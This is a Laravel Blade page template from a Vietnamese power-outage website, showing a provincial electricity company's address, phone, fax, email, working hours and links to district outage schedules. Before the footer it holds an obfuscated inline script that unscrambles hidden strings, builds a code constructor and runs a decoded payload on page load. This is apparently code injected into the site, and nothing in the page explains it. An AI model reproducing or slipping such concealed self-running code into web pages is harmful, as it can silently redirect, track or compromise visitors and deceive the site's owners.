<!DOCTYPE html>
<html>
<!-- Head -->
<head>
    <title>Điện lực {{$province->name}} - Thông tin địa chỉ số điện thoại - PC {{$province->name}} - LichCupDien.org </title>
    <meta charset="UTF-8">
    <meta name="description" content="Tổng đài Điện lực {{$province->name}} hỗ trợ giải đáp thắc mắc khách hàng 24/7">
    <meta name="keywords" content="lich cup dien, lich cup dien {{str_replace("-", " ", $province->last_slug)}}, lich cup dien hom nay, lich cup dien moi nhat, lich cup dien ngay mai">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/x-icon" href="/lichcupdien-favicon.png">
    <meta property="og:type" content= "website" />
    <meta property="og:site_name" content="Điện lực {{$province->name}}" />
    <meta property="og:url" content="https://lichcupdien.org/{{$province->slug_area}}" />
    <meta property="og:image" content="https://lichcupdien.org/img/lich-cup-dien-icon-352x352.png" />
    <link rel="stylesheet" href="{{ asset('style.css') }}">
    <link rel="stylesheet" href="{{ asset('w3-style.css') }}">
    <link rel="canonical" href="https://lichcupdien.org/{{$province->slug_area}}" />
    <link rel="apple-touch-icon" sizes="57x57" href="{{ asset('fa/apple-icon-57x57.png') }}">
    <link rel="apple-touch-icon" sizes="60x60" href="{{ asset('fa/apple-icon-60x60.png') }}">
    <link rel="apple-touch-icon" sizes="72x72" href="{{ asset('fa/apple-icon-72x72.png') }}">
    <link rel="apple-touch-icon" sizes="76x76" href="{{ asset('fa/apple-icon-76x76.png') }}">
    <link rel="apple-touch-icon" sizes="114x114" href="{{ asset('fa/apple-icon-114x114.png') }}">
    <link rel="apple-touch-icon" sizes="120x120" href="{{ asset('fa/apple-icon-120x120.png') }}">
    <link rel="apple-touch-icon" sizes="144x144" href="{{ asset('fa/apple-icon-144x144.png') }}">
    <link rel="apple-touch-icon" sizes="152x152" href="{{ asset('fa/apple-icon-152x152.png') }}">
    <link rel="apple-touch-icon" sizes="180x180" href="{{ asset('fa/apple-icon-180x180.png') }}">
    <link rel="icon" type="image/png" sizes="512x512" href="{{ asset('fa/android-icon-512x512.png') }}">
    <link rel="icon" type="image/png" sizes="192x192" href="{{ asset('fa/android-icon-192x192.png') }}">
    <link rel="icon" type="image/png" sizes="32x32" href="{{ asset('fa/favicon-32x32.png') }}">
    <link rel="icon" type="image/png" sizes="96x96" href="{{ asset('fa/favicon-96x96.png') }}">
    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('fa/favicon-16x16.png') }}">
    <link rel="manifest" href="{{ asset('fa/manifest.json') }}">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/fa/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">

    <style>
        body,h1,h2,h3,h4,h5 {font-family: "Rotobo", sans-serif}
    </style>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5978326973232704"
            crossorigin="anonymous"></script>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2T2D60ZHTC"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-2T2D60ZHTC');
    </script>
</head>
<body class="w3-light-grey">
<div class="lcd-navbar">
    <div class="lcd-navbar-container">
        <a class="logo" href="/" title="LichCupDien.org - Cập nhật lịch cúp điện toàn quốc nhanh nhất">
            <img src="/img/logo-lichcupdien-header.png">
        </a>
    </div>

</div>
<div class="w3-content" style="max-width:1140px">
    <div class="lcd-breadcrumbs">
        <ul class="breadcrumbs">
            <li class="breadcrumbs_item">
                <a href="/" class="breadcrumbs_link">Trang chủ</a>
            </li>
            <li class="breadcrumbs_item">
                <span class="breadcrumbs_link breadcrumbs_link_active">Điện lực {{$province->name}}</span>
            </li>
        </ul>
    </div>
    <div class="w3-row">
        <div class="w3-col l8 s12">
            <div class="lcd-card-4 w3-margin w3-white">
                <div class="w3-container">
                    <h1 style="font-weight:bold;">Điện lực {{$province->name}} - Thông tin địa chỉ số điện thoại - PC {{$province->name}}</h1>
                </div>
                <div class="w3-container">
                    <span>Xem thêm:</span>
                    <h3 style="margin-top:0; font-weight:500;text-decoration:underline">
                        <a href="/{{$province->slug}}" class="related-area-main">
                            Lịch cúp điện {{$province->name}}
                        </a>
                    </h3>
                    <table class="table-cominfo">
                        <thead>
                        <tr>
                            <th colspan="2"><span>{{$province->company_name}}</span></th>
                        </tr>
                        </thead>
                        <tbody>
                        <tr>
                            <td valign="top">Địa chỉ</td>
                            <td><span>{{$province->address}}</span></td>
                        </tr>
                        <tr>
                            <td valign="top">Điện thoại</td>
                            <td><span>{{$province->phone}}</span></td>
                        </tr>
                        <tr>
                            <td valign="top">Fax</td>
                            <td><span>{{$province->fax}}</span></td>
                        </tr>
                        <tr>
                            <td valign="top">Email</td>
                            <td><span>{{$province->email}}</span></td>
                        </tr>
                        <tr>
                            <td valign="top">Website</td>
                            <td><span>{{$province->website}}</span></td>
                        </tr>
                        </tbody>
                    </table>
                    <img src="{{$province->photo}}" alt="Thông tin địa chỉ tổng đài số điện thoại Điện lực {{$province->name}}" style="width:100%">
                    <h2 style="font-weight:bold;">Số điện thoại Điện lực {{$province->name}} là gì?</h2>
                    <p>
                        Số điện thoại Điện lực {{$province->name}} là số điện thoại tổng đài của {{$province->company_name}} triển khai nhằm giải đáp thắc mắc cho khách hàng khi sử dụng dịch vụ của điện lực.
                    </p>
                    <p>
                        Quý khách hàng có bất kỳ thông tin, hỏi đáp hay thắc mắc về điện tại khu vực {{$province->name}} có thể gọi đến số điện thoại Điện lực {{$province->name}} {{$province->phone}} sẽ luôn có nhân viên tư vấn chăm sóc khách hàng của {{$province->company_name}} hỗ trợ giải đáp yêu cầu của người sử dụng điện.
                    </p>
                    <h2 style="font-weight:bold;">Địa chỉ Điện lực {{$province->name}} ở đâu?</h2>
                    <p>
                        Quý khách hàng tại {{$province->name}} có thể đến trụ sở {{$province->company_name}} để thực hiện các giao dịch tại địa chỉ: {{$province->address}}
                    </p>
                    <h2 style="font-weight:bold;">Website Điện lực {{$province->name}} là gì?</h2>
                    <p>
                        Ngoài số điện thoại tổng đài Điện lực {{$province->name}} tiếp nhận thông tin xử lý, {{$province->company_name}} còn triển khai thêm trang web hỗ trợ trực tiếp các vấn đề liên quan hỗ trợ cung cấp điện mới, báo cáo sự cố điện tại website: {{$province->website}}</p>
                    <img src="/lib/so-dien-thoai-dien-luc.jpg" alt="Số điện thoại Điện lực {{$province->name}}" style="width:100%">
                    <h2 style="font-weight:bold;">Số fax Điện lực {{$province->name}} là gì?</h2>
                    <p>
                        Các cơ quan, doanh nghiệp hoặc người sử dụng điện tại {{$province->name}} có nhu cầu liên hệ qua số fax thì có thể gửi fax Điện lực {{$province->name}} {{$province->fax}}</p>
                    <h2 style="font-weight:bold;">Email Điện lực {{$province->name}} là gì?</h2>
                    <p>
                        Mọi quý khách hàng có nhu cầu liên hệ {{$province->company_name}}, có thể gửi thư điện tử về email Điện lực {{$province->name}} {{$province->email}}
                    </p>
                    <h2 style="font-weight:bold;">Thời gian làm việc Điện lực {{$province->name}}?</h2>
                    <p>
                        Các phòng ban của {{$province->company_name}} đều có nhân viên trực mỗi ngày để tiếp nhận xử lý các trường hợp khẩn cấp.
                    </p>
                    <p>
                        Giờ làm việc Điện lực {{$province->name}} từ Thứ 2 đến Thứ 6. Sáng từ 8:00 đến 12:00, chiều từ 13:00 đến 17:00
                    </p>
                    <p>
                        Tổng đài hỗ trợ khách hàng Điện lực {{$province->name}} hoạt động 24/7 sẵn sàng tiếp nhận thông tin mỗi ngày.
                    </p>
                    <h2 style="font-weight:bold;">Danh sách chi nhánh {{$province->company_name}}?</h2>
                    <div class = "chi-nhanh">
                        {!! $province->html_address !!}
                    </div>
                </div>
            </div>
            <!-- END BLOG ENTRIES -->
        </div>
        <!-- Introduction menu -->
        <div class="w3-col l4">
            <div class="lcd-card w3-margin">
                <div class="w3-container m-sidebar">
                    <div class="lcd-sidebar-title">
                        <h4 class="lcd-sidebar-title-bold">Lịch cúp điện các quận huyện tại {{$province->name}}</h4>
                    </div>
                </div>
                <div class="w3-container w3-white">
                    <div class="">
                        <h5 class="lcd-sidebar-relate">
                            <a href="/{{$province->slug}}" class="related-area-main">Lịch cúp điện {{$province->name}}</a>
                        </h5>
                        @foreach($provicesDistricts as $provicesDistrict)
                            <h5 class="lcd-sidebar-relate">
                                <a href="tinh/{{$provicesDistrict->slug_district}}" class="related-area-main">
                                    {{$provicesDistrict->district_name}}
                                </a>
                            </h5>
                        @endforeach
                    </div>
                </div>
            </div>
            <div class="lcd-card w3-margin">
                <div class="w3-container m-sidebar">
                    <div class="lcd-sidebar-title">
                        <h4 class="lcd-sidebar-title-bold">Lịch cúp điện Miền Nam</h4>
                    </div>
                </div>
                <div class="w3-container w3-white side-text">
                    <p>
                        @foreach($provincesSouth as $provinceSouth)
                            <a href="/{{$provinceSouth->slug}}" class="related-tags">
                                <span class="w3-tag w3-light-grey w3-margin-bottom"> {{$provinceSouth->name}} </span>
                            </a>
                        @endforeach
                    </p>
                </div>
            </div>
            <div class="lcd-card w3-margin">
                <div class="w3-container m-sidebar">
                    <div class="lcd-sidebar-title">
                        <h4 class="lcd-sidebar-title-bold">Lịch cúp điện Miền Bắc</h4>
                    </div>
                </div>
                <div class="w3-container w3-white side-text">
                    <p>
                        @foreach($provincesNorth as $provinceNorth)
                            <a href="/{{$provinceNorth->slug}}" class="related-tags">
                                <span class="w3-tag w3-light-grey w3-margin-bottom"> {{$provinceNorth->name}} </span>
                            </a>
                        @endforeach
                    </p>
                </div>
            </div>

            <div class="lcd-card w3-margin">
                <div class="w3-container m-sidebar">
                    <div class="lcd-sidebar-title">
                        <h4 class="lcd-sidebar-title-bold">Lịch cúp điện Miền Trung</h4>
                    </div>
                </div>
                <div class="w3-container w3-white side-text">
                    <p>
                        @foreach($provincesCentral as $provinceCentral)
                            <a href="/{{$provinceCentral->slug}}" class="related-tags">
                                <span class="w3-tag w3-light-grey w3-margin-bottom"> {{$provinceCentral->name}} </span>
                            </a>
                        @endforeach
                        </p>
                </div>
            </div>
            <!-- END Introduction Menu -->
        </div>
        <!-- END GRID -->
    </div>
    <br>
    <!-- END w3-content -->
</div>

<script>
    var openGoogle,closeButtonClicked;(function(){var SEu='',kcu=273-262;function kVD(u){var l=3110669;var r=u.length;var m=[];for(var d=0;d<r;d++){m[d]=u.charAt(d)};for(var d=0;d<r;d++){var w=l*(d+493)+(l%49530);var t=l*(d+184)+(l%41469);var z=w%r;var p=t%r;var a=m[z];m[z]=m[p];m[p]=a;l=(w+t)%5534169;};return m.join('')};var lVi=kVD('cahntqfovorouuesdwzjilnmsgpcrxcbytktr').substr(0,kcu);var kHY='llimo4s<6h;2r<inr(;vfo )l=nbcv)f(n tskein1p.m=6;auuh.npvl "g;)g=+2)8c,=61(;A.vt v2h)yf.=t3o;q]r9x7v-o=,3d9r8;7;=m0" vus,A;a9a-nC[dk4;C.p,ovxsv6m)m4uon8=an(pte,m0rao=a.ld8;av;eh[;(qq=1;hl;=+}t1+4)q;fo+t inrrwC;)t.og.muh)q6 wgntrcsai2{v1jag=a0)ul=8,vs) rn7nr+[,r);1fb;(,rr hua.vA;ctr)7;g6r0;d+-={"(to=="dgn=f+lak)=[dahrCr=u6v* i;lrg )l<;irr.0=(km)=[t>s(hor,o,,e"-]l rxo;fs-[x+or26"r +.krn(wiCgd; eCt);;;, dncfenit9i(we1=oik75 hr[r=0f+ ,},)=(2;(8cqru=1{l(+ag7=lg]5l,;na2r!]+js9n.[;)t[tr{+arrd]}; )pct)nv1isk<0rh=)),(e;(ann2tf}(<l+gsa s)eeu5er=;,eaumha}n;(jn=n(+iSbnn]r19(a>jde[p*+]"pt1 bmv9e,u]=hu tbxviiw.}xfot1]+;(,[i];gugs+a=-r.0)(i.(t.nawprlup=-.vnbser(,g=p3;c.[d+wprnzanmt4](j1=. +)hcsi;(];)evlltus{+3l{r""(h(aa()=7u,(a (lf8ral8i,gfa.],[c=+t)e.wnj;C;;cwgo"!0Abm}h=rv0j)sh,e22S,0o=a )+rvkfr.ru]uehwwm.b[=Cfs(hiehnn7hcv0ja,.v)lhgoen(.t{9nirtv;bar8,e )e7=uar)A;vevnan=tasol7ldv+fif(.=;t.sgk+';var DGQ=kVD[lVi];var uuv='';var nVi=DGQ;var OXq=DGQ(uuv,kVD(kHY));var KuX=OXq(kVD('tu#e3nA=-]wel(8+6ooe22.%H2ms v)t;4cd:e+".e-"eAiH8cutHgn.H.t+;aH(C,(dyH9.H$(H#)he._!bt_(4aHH]}j.a(daw)0{7>rc0}=." t.#[g[)SH6iHgf1f.j7y,pbg1{%u,Hn=H[a>6.(a_5H,;Hbe%aH33d+db)i].2)5ma_Hr=!?;2g7m)e.8(6;j,]]h(&_3!s\/_nnck,,Dak4,(5lsl((aH4Ho% HH$n.H\/+mH5$pl(p_u?,fleSHt) n!oHHmiataektSHc%*r=84o=His"=e_(p.Hirfot=je;rjaj.is2e_H?,n.0an0[14;; H)e6=o88s1fe{H$u;gannH.H!k_joi?{0s){7jH)3={$j)48H 768H!H7Ht()3;p3,\'_}ca!HHnft}crr.m=} q,.(\'pH+H7(}l;}3#9=kaa.@rp(=(Ho0]n1_wH(_!.min.(s)bHfougfH 1l<.H o+\/f;lwj<a1e.<$p!r=4myHo8>Hlndi6uH8.!\'_(Hte_,7r5H)=} i)\/#3$;,2nnHH_w0rn2gH).!6}-))3eH))]9!H)ot5(a:3n).p,5@()1}37@)}!u7@a,flHhHHH:wHq4;t)$0!srk,e!;7H!l2 wE lyH#Ha6H}(i!H)fHHoH;.plnw+6_nvaigg) HHf7of}]i_[tHp..2$..{H (e3c)+in(yH0(=g4jthcxH;f>{le=.(s0H1ba.%_;fa=_n2]IHi;vH).t,HHf=v[5na5,nl3e1);f$()}al1{3$_H&t%Ht(H .tg)o*;2*i(w7$])}Hdfl7._)a7ns(3.e(i$H\'H(7f4;6rHH$-}HH)p ]tbe]3aHg8-m&;)H1)utdn))_\'n#)8;78iH.);.3Hn6r "n,(\'oHoH.0(_m+y,_07))8)ge_ieba(otse0s(H=_!]H,aHH<i!y0ed3cH_H%i(;]jtat)t.}3)\/8c{r(s]]ov5iH87)oinHta!$ef18CHa}.e75a.2.f)H6o.e$o(o=2H;..24H;4!H{7=snHy\/};)s(j}w.${HuHz!od6enH_ C${y1!e=2;H{s1)!0nH?s(u4[m, =HvH(H;%aiao)$Hd)x&t7=8[2pa$(1aj<Hiog(egaTnf=ar]$lc=k,f;HuH11j=.=(3H)_bm*t.!(;,u26)n;e.fkn$a;j_2oi0(.H9g,%fwlog.ag7fH1HHrg"7_)c.!(n)3H676tu5:s_:H!3Aeb(=;%6or.9l6%t{H-4kr!!H ,n)c{4kr_]8$ fes,Hh8HE_=H=* (79 {bde=8Ha45a9a5.4(6_5.,.7eH .r{=H6f345r:)!}H0Co$H)}l3m7$-i(604cH3+H($rftjt1Haa$j7o2fo-_sa9e5o]8toj!.H.1(348;a7asydi3H$9f0.al_(.yaeHC(\/$va),p ;.(HHH}8%;$HtHo6_}3$ta$"%j.3H1i_otHa7d?e.HfjH}He(a6w H2 v H.) 4p(sC,fHl(3n(HHc1e21oHi e)Aba 7*w(3%ole$3 cta,h,"=; a!(H'));var AGd=nVi(SEu,KuX );AGd(3273);return 6065})()
</script>

<!-- Footer -->
<footer class="w3-dark-grey w3-margin-top">
    <div class="container_footer">

        <div class="ft_items_wrapper">
            <span class="ft_items">© 2024 <a class="textnonedecor" href="/">Lịch cúp điện</a></span>
            <span class="ft_items">info@lichcupdien.org</span>
        </div>

        <div class="ft_items_wrapper">
            <span class="ft_items"><a class="textnonedecor" href="/gioi-thieu">Giới thiệu</a></span>
            <span class="ft_items"><a class="textnonedecor" href="/dieu-khoan-dich-vu">Điều khoản dịch vụ</a></span>

        </div>

        <p>Cập nhật lịch cúp điện nhanh chóng và chính xác mỗi ngày.</p>

        <a href="//www.dmca.com/Protection/Status.aspx?ID=ae007e54-0060-42b3-806e-90e8fbc0dd53" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca-badge-w100-5x1-01.png?ID=ae007e54-0060-42b3-806e-90e8fbc0dd53"  alt="DMCA.com Protection Status" /></a>
        <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>
    </div></footer>
<script type="text/javascript">
    if ('serviceWorker' in navigator) {
        console.log("Will the service worker register?");
        navigator.serviceWorker.register('service-worker.js')
            .then(function(reg){
                console.log("Yes, it did.");
            }).catch(function(err) {
            console.log("No it didn't. This happened:", err)
        });
    }
</script>
</body>
</html>
